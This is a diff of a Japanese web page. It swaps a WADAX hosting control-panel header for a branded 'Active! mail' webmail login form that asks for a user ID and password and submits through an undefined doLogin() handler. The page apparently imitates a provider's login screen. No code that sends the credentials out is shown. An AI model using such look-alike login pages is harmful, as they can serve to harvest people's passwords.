@@ -1,386 +1,168 @@
 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
 <html>
-<!-- ↓ここから headerFrame------------------------------------------  -->
 <head>
-<meta charset="UTF-8">
-<!--<base href="https://hs14.wadax.ne.jp:8443/controlPanel/">-->
-<title>WADAX-コントロールパネル</title>
-<link href="http://www.wadaxinc.co.jp/favicon.ico" rel="shortcut icon">
-<META http-equiv=Content-Style-Type content=text/css>
-<STYLE type=text/css>.bltopc {
-	BACKGROUND-image: url(data:image/gif;base64,R0lGODlhFAANAJEAAMnU9JSo6tLb9gAzzCH5BAAAAAAALAAAAAAUAA0AAAIalI+pywgPo5Sh2ovx2Lz7D4biSJbmiabqKhYAOw==); BACKGROUND-REPEAT: repeat-x
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
+<meta http-equiv="AM-Template" content="standard/html/index.html">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="Content-Language" content="ja">
+<meta name="format-detection" content="telephone=no">
+<title>WADAX Active! mail</title>
+
+<link rel="stylesheet" type="text/css" href="https://activemail.kagoya.com/am_viz/common/standard/popup.css?6.5002005200" />
+<link rel="stylesheet" type="text/css" href="https://activemail.kagoya.com/kir_files/css/index_ff150.css">
+<link rel="shortcut icon" href="https://www.wadax.ne.jp/common/images/favicon.ico">
+
+<script type="text/javascript">
+<!--
+function kir_page_display_init()
+{
+  
 }
-.blmidl {
-	BACKGROUND-image: url(data:image/gif;base64,R0lGODlhFAAUAIAAAAAzzP///yH5BAAAAAAALAAAAAAUABQAAAIohG+hy4rYYnhHNprswkBv7DlgyIXT6JUkqqkpa7ktLMkxHdk1fvFMAQA7); BACKGROUND-REPEAT: repeat-y
-}
-.blmidr {
-	BACKGROUND-image: url(data:image/gif;base64,R0lGODlhFAAUAIAAAAAzzP///yH5BAAAAAAALAAAAAAUABQAAAIojI8Gy5sfWoNJMoqsw0rzbn2R92mAaKIkl5Yr1rIvFcMzVNP3k+NaAQA7); BACKGROUND-REPEAT: repeat-y
-}
-.bgttl {
-	BACKGROUND-image: url(data:image/gif;base64,R0lGODlhAQApALMAAP/3pP//zP//1f/////5tP//5f/7vf//9//4rf/8xP/6ugAAAAAAAAAAAAAAAAAAACH5BAQUAP8ALAAAAAABACkAAAQTcMhThL0iaJ16N2BIjARingBQRAA7); BACKGROUND-REPEAT: repeat-x
-}
-.bldotrep {
-	BACKGROUND-image: url(/.img/bldotrep.gif); BACKGROUND-REPEAT: repeat-x
-}
+//-->
+</script>
+</head>
 
-.moko4 {
-border-color: #EEEEEE #999999 #999999 #EEEEEE;
-border-style: solid;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px;
-background-color: #EEEEEE;
-}
+<body topmargin="0" leftmargin="0" text="#000000" bgcolor="#FFFFFF" onload="kir_page_display_init();">
 
-.moko3 {
-border-color: #EEEEEE #999999 #999999 #EEEEEE;
-border-style: solid;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px;
-background-color: #DDDDDD;
-}
+<noscript>このページではJavaScriptを使用しています。<br />ご使用のブラウザでJavaScriptを有効にしてご利用下さい。</noscript>
 
-.moko2 {
-border-color: #EEEEEE #999999 #999999 #EEEEEE;
-border-style: solid;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px
-}
+<div id="ajax_content" style="position:absolute;visibility:hidden;display:none;"></div>
+  <form name="LoginForm"  onSubmit="return doLogin()" class="inner">
+  <div class="logo">
+    <img src="data:image/gif;base64,R0lGODlhpAA7ANUhAP///w4xkkplrcPL5IaYyB0+mWl/u7O+3fDy+FpytOHl8dLY6jtYp6Sx1ixLoHiLwpWlz/gAP//v8/t/n/kgV/gQS/pAb/7f5/2vw/yft/tgh/2/z/pQe/7P20lFlfkwY/twk////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACEALAAAAACkADsAAAb/wJBwSCwaj8ikcslsOp/QqHRKrVqvVIB2C8B6v+AwmMsVm8/o9JYSiYC06bh8HtVO2hQJnM7v97UXFW0Ye36Gh2JbHG0WW4iPkFZaGG0VF4WRmZpKWhJsEROYm6OkIXZtH46lq5paHW0RG6KstH5bFm0aqrW8fwAZlXpdm2RJxUjHQslFZM2zyGVGzcanERnPiM5H2tLTpt5EzuLYyuDl5kNcno1w6HxaCQIJs1sC8vQACPYP7Vr2A/ga2Bs4kAAEBdG2ASAggAAmLQoGAhzGDMAAex4udRF3SIuBAAEWiNIyAGQAhBTLHQAJoV/JAAbwETBJk6aAiSnDASgQoMCu/28PQDL4+Q2BA5AONwJYkOBBgqQ552hZGSBpxaAsRwL4eLIfVp9aZ9YcW5XotwUmDzzMx7NsTi1iHSDgooDBAwIDDPCLKkcLAqFaj4IUoJXn0GFaBAdQ+3ahUIICFIPc2xgrTK0NQBZAmQ6AApMTvxm4COEmg7l848ADybncZ5qoO6MNsPcszZiNxeLcokAsSMYVFYNNWQ/kvH4ABBh35C95gs14yaHRAgFkg0LUQQq+TlELVpFKLff8CRfkbi4L2haIXW52Wq2vF/fL3JO9x4gHEgxI0NrX6+OdKRfAS7h1xsB4iAFwVAEJ/LaWbmst1ZZV5WDV4GVRlReAXFsg0P9WS91ZxMBBAzAknRoAHBgAc/kMpiCCSr1WIEQgGUBfgZ1B2BgA1W2I3YvraUbUFoJBhdVhIQJwAAMCMGAAe4Z456BS9LXEFXBa0Iclj7/9BWOO5uHzYkj9yAjAhcBV9BKZa4JXETcdLVVjPxciRFVtqwUQmxYqzoXmjzoqhJVV2QVw3Y1ickWYirV1s0ycPDlARqRbaEfGcjFiimiIgXbzEoB8gjSXl8N14+Fg2kHJi0cggafkZFtc6CpVIH7TI3ekqqJhaKYCxhumZ06pEH3vpbbKVEht8d0WVW7BFWehdpVnmrtio4VJXNzK7Jx8FefiiaP45SuQdI171GFFjQv/wKbldNoNtluoiFKLX3bTo6HgkpInQrPNmKKoctI2X1YdCtmPuxXBSy+S0+Jzaqr5ErOudVzKp5RY1/Xo5r5k/HlxmKldC2OzXLCr01Y1NdqLa8v12c9s8xwIVrpk3XYwyArNRlieNddbzpq+ublyOX1i2tmCXvpLbM/DVdttxXt52bOw5wjGj6Jm0aLhhbWWw5XH31w4tcVOO6oid0v3jOM3Yq3HFsFD20ZTf8jS1Ix2A+Std9494la2miahdmEDe+/NU6k0Tlmx28aWkphJ6HYGAE2gviqwOIdzgfA3yXE7uY/iXEmGgDt76/fQrCbbmNjcidbqOKL/TQZX0t45/w5Vfk/cE7QBDxhxJHWT2Rix82pBaYaW+60jGQjQThlXQkueuV8T/oiVpL8/Uino3byGbt1rSw/j8ksN8EBbAZy2xfEKxc4Vkp0ZpTrqwYZvoFuuW9z+lL5NrT74zwDgmnjVGapsJnvZmFiaKjKTje3EZzrBnYamlgDUpG6BJ8uc1Ybkj281rhWeKVU3FoA9udlPfGDp31j0w6LphQxlARAQ4xSigLZgUGtKIkeWypS3/owwbxApnN5ctQeSDCB63SucDyuygLwhEYdZO0cRH/WmcYxDcglRCEegQUUoLoE8Uawi5+AkRiaQkRoIpJ8V18jGNroxjHF7whvnSMc62sjxinG8oxH1dgAC+PGPfoSMIAdJyEI+BZB/LBwR6+g4KyIgbw3w4wMGIpmxWfKSmMwk5ArixwMAcY3AI8MC+miAyGjylKhMpSrHwqS7DKB4H1SNZxiyylra8papZBAEVGWLz+Hyl8AMJlkiF6cGqEiYyEymKlkYy+l0qETxUKY0p6kZARgAAueBhBX5Fkh7oI+a4ByLA+xxSMItsotxmuMj9QYBQE5SkJWUJpMEiUjC6c2OvdCjPvfJTzzGsQn9DGg//0nQglYhCAA7" alt="WADAX Active! mail" title="WADAX Active! mail" width="164" height="59">
+  </div>
+  <div class="border"><br></div>
+  <div class="layout">
+    <table class="login">
+     <tr>
+      <th><img src="https://activemail.kagoya.com/am_viz/common/img/standard/index_login.gif"></th>
+     </tr>
+     <tr>
+       <td>
 
-.moko {
-border-color: #EEEEEE #999999 #999999 #EEEEEE;
-border-style: solid;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px;
-background-color: #CCCCFF;
-font-weight=bold
-}
+        <table class="inner" cellspacing="3" cellpadding="3">
+          <tr>
+            <td colspan="3"></td>
+          </tr>
+          <tr>
+            <th>ユーザID :</th>
+            <td>
+              <input type="text" class="length" name="email" id="email" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="1">
+            </td>
+            <td>
+            </td>
+          </tr>
+          <tr>
+            <th>パスワード :</th>
+            <td colspan="3">
+              <input type="password" class="length" name="password" id="password" size="20" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="2">
+            </td>
+          </tr>
+          <tr style='display:none'>
+            <th></th>
+            <td colspan="3">以下に表示されている文字を入力してください</td>
+          </tr>
+          <tr style='display:none'>
+            <th></th> 
+            <td colspan="3">
+              <img src="">
+            </td>
+          </tr>
+          <tr style='display:none'>
+            <th></th>
+            <td colspan="3">
+              <input type="text" class="length" name="am_captcha" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="3">
+            </td>
+            <td></td>
+          </tr>
+          <tr>
+            <th>言語選択 :</th>
+            <td colspan="3">
+              <select name="language" tabindex="4">
+                <option value="auto">自動選択</option>
+<option value="en">英語</option>
+<option value="ja">日本語</option>
+<option value="ko">韓国語</option>
+<option value="zh-cn">中国語</option>
 
+              </select>
+            </td>
+          </tr>
+          <tr>
+            <td colspan="4" class="authinfo">
+              <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on" tabindex="5" ><label for="save_authinfo">パスワード以外のログイン情報を保存する</label>
+            </td>
+          </tr>
+          <tr>
+            <th colspan="2" class="copyright">WADAX Active! mail <br />&#169;1998-2018 QUALITIA CO., LTD. All Rights Reserved.</th>
+            <th>
+              <input type="submit" value="  ログイン  " id="submit-btn">
+            </th>
+          </tr>
+        </table>
 
-.wakuDot {
-border-color: #CCCCCC #CCCCCC #CCCCCC #CCCCCC;
-border-style: dotted;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px;
-background-color: #EEEEFF;
-}
-
-.wakuCaution {
-border-color: #CCCCCC #CCCCCC #CCCCCC #CCCCCC;
-border-style: dotted;
-border-top-width: 1px;
-border-right-width: 1px;
-border-bottom-width: 1px;
-border-left-width: 1px;
-background-color: #FFFFCC;
-}
-
-.title {
-border-color: #0033cc #0033cc #0033cc #0033cc;
-border-style: solid;
-border-top-width: 1px;
-border-right-width: 0px;
-border-bottom-width: 1px;
-border-left-width: 0px;
-}
-
-h1 { font-size: 14pt; font-weight: bold}
-body{font-size:10pt }
-td{font-size:10pt }
-
-.link { height:13pt }
-
-
-
-/* ----------------------------------------
- * ページプロパティ［デフォルト］
- * ---------------------------------------- */
-body{
-	margin-top: 0px;
-	background-color: #ffffff;
-	color:#333333;
-	font-family: Osaka, "ＭＳ Ｐゴシック", Verdana, Helvetica, Geneva, sans-serif;
-}
-
-/* ----------------------------------------
- * リンク
- * ---------------------------------------- */
-/* ---------- 標準 ---------- */
-a:link{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 12px;
-	line-height: 1.3em;
-}
-a:visited{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 12px;
-	line-height: 1.3em;
-}
-a:hover{
-	color: #0099ff;
-	text-decoration: underline;
-	font-size: 12px;
-	line-height: 1.3em;
-}
-
-/* ---------- 標準 行高大---------- */
-a.h:link{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 12px;
-	line-height: 1.4em;
-}
-a.h:visited{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 12px;
-	line-height: 1.4em;
-}
-a.h:hover{
-	color: #0099ff;
-	text-decoration: underline;
-	font-size: 12px;
-	line-height: 1.4em;
-}
-
-/* ---------- リンク小 ---------- */
-a.s:link{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-a.s:visited{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-a.s:hover{
-	color: #0099ff;
-	text-decoration: underline;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-
-/* ---------- リンク小（固定） ---------- */
-a.ps:link{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-a.ps:visited{
-	color: #0099ff;
-	text-decoration: none;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-a.ps:hover{
-	color: #0099ff;
-	text-decoration: underline;
-	font-size: 10px;
-	line-height: 1.3em;
-}
-
-/* ---------- リンク小（固定・未リンク） ---------- */
-.ps{ font-size: 10px; line-height: 1.3em; }
-
-/* ----------------------------------------
- * フォント［標準］
- * ---------------------------------------- */
-/* ---------- ノーマル ---------- */
-.s{ font-size: 10px; line-height: 1.3em; }
-.m{ font-size: 12px; line-height: 1.3em; }
-.l{ font-size: 14px; line-height: 1.3em; }
-
-/* ---------- ボールド ---------- */
-.sb{ font-size: 10px; line-height: 1.3em; font-weight:bold; }
-.mb{ font-size: 12px; line-height: 1.3em; font-weight:bold; }
-.lb{ font-size: 14px; line-height: 1.3em; font-weight:bold; }
-
-/* ----------------------------------------
- * フォント［赤（注釈）］
- * ---------------------------------------- */
-/* ---------- ノーマル ---------- */
-.s-red{ font-size: 10px; line-height: 1.3em; color: #ff3366; }
-.m-red{ font-size: 12px; line-height: 1.3em; color: #ff3366; }
-.l-red{ font-size: 14px; line-height: 1.3em; color: #ff3366; }
-
-/* ---------- ボールド ---------- */
-.sb-red{ font-size: 10px; line-height: 1.3em; font-weight:bold; color: #ff3366; }
-.mb-red{ font-size: 12px; line-height: 1.3em; font-weight:bold; color: #ff3366; }
-.lb-red{ font-size: 14px; line-height: 1.3em; font-weight:bold; color: #ff3366; }
-
-/* ----------------------------------------
- * フォント［オレンジ（強調）］
- * ---------------------------------------- */
-/* ---------- ノーマル ---------- */
-.s-or{ font-size: 10px; line-height: 1.3em; color: #ff6600; }
-.m-or{ font-size: 12px; line-height: 1.3em; color: #ff6600; }
-.l-or{ font-size: 14px; line-height: 1.3em; color: #ff6600; }
-
-/* ---------- ボールド ---------- */
-.sb-or{ font-size: 10px; line-height: 1.3em; font-weight:bold; color: #ff6600; }
-.mb-or{ font-size: 12px; line-height: 1.3em; font-weight:bold; color: #ff6600; }
-.lb-or{ font-size: 14px; line-height: 1.3em; font-weight:bold; color: #ff6600; }
-
-
-</STYLE>
-</HEAD>
-<BODY text=#333333 bgColor=#ffffff leftMargin=0 topMargin=0 marginheight="0" marginwidth="0">
-<center>
-<table border=0 cellpadding=0 cellspacing=0 width=760>
-<tr>
-  <td colspan=3>
-	<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center bgColor=#0033cc border=0>
-	  <TR>
-	    <TD class=bltopc vAlign=top align=left width=20 height=61><IMG height=45 
-	      src="data:image/gif;base64,R0lGODlhFAAtAOYAANLb9snU9JSo6sDM8rbE8HSQ40Vq2ld53Zmu64ef562975Cm6aO27U5x3GGB34qg6Dti2H6Y5WqI4RVC0h5J1Fh33sfR9RdD0oOb5ll63AMyzk9y3TJb1qy87Z6x7Jaq6YWe6QIyzuzv+52w7TFY1q298BZC0hNA0qm572WF4aG17VZ53+ru+wk4z36X5Qk3z8LO9JOo6gQzzoif6Aw60MTP9KW37BND0CFM1Ojt+yhT1HiU5CtU1CBL1Ovv+1x74P///wAzzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUAC0AAAeogECCg4SCFgCIiQCFhDUoipCMQDAlAZaXmAGMHgOdnh0CoaKEIiMEpwQqPxdBra5Bgz4fCrQ2Fa+4sIIzDL0gFLm4gjEIxS4twcIsDwsLDy/JwhgJ1DjRuDk7EREb17gLBeEm3q8pEhIr5K8ZDg4k6q4H8hPwrQ33J/VBBvwy+hAQeugLwoGHhoE6aAwMcmNhkBAOI0qcSLGixYsYM2rcyLGjx48gIwYCADs=" width=20></TD>
-	    <TD class=bltopc height=61>　<A href="#"><IMG 
-	      height=61 alt=レンタルサーバー　WADAX src="data:image/gif;base64,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" width=113 
-	      border=0></A></TD>
-	    <TD class=bltopc vAlign=top align=right width=20 height=61><IMG height=45 
-	      src="data:image/gif;base64,R0lGODlhFAAtAOYAANLb9snU9JSo6sDM8rbE8HSQ462975mu65Cm6Yef505x3EVq2qO27Vd53Yqg6Dti2GqI4X6Y5WGB3+jt+wk3z6m57x5J1Jaq6Vl63Aw60AMyzuru+yhT1AIyzp2w7SBL1FZ534Ob5hZC0p6x7Ky87Vx74BVC0n6X5cTP9MLO9KG17RdD0mWF4RND0Fd53+zv+xNA0jJb1gk4z5Oo6sfR9Yif6KW37Fh33niU5DFY1itU1A070Km774We6SFM1Ovv+////wAzzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAAAUAC0AAAergACCgwA0QIeIiYeEjBUoiokBkpOUATwpkEACm5wkA5+gI5BBpKVBKyUqBKsEHi+JprFBNzYGthc/iLKxFj0MvzW6u6YyJwfHM4fDsRQOCAgOG0DLsT4J1yHT1KYuERE4E9umIgXlCOKmIBAQLOilORISGO6kJg339EEwCvz5OwsA8wX58OCBQA06YggMkoHDwiAtHnZ4SLGixYsYM2rcyLGjx48gQ4ocGSQQADs=" width=20></TD>
-	  </TR>
-	</TABLE>
-   </td>
-</tr>
-<tr>
-  <td colspan=3>
-	<TABLE cellSpacing=0 cellPadding=0 width="100%" align=center bgColor=#ffffff border=0>
-	  <TR>
-	    <TD vAlign=top align=left height=20><IMG height=20 src="data:image/gif;base64,R0lGODlhGAAUALMAAM/Z9Q8/z7/M8t/l+Z+y7B9M0o+l6e/y/C9Z1X+Z5T9l2W+M4l9/3////wAzzAAAACH5BAAAAAAALAAAAAAYABQAAARJ0MlJq0UG2G3ZaCAnKh8YilVAmCxKBQDbug4sz6h9m7Sw45zED2gpHIY80Qp52hSYyY0B2rSUoBwEtUpZbBucJZXj25K/nOM2AgA7" width=24></TD>
-	    <TD bgColor=#ffffff height=20></TD>
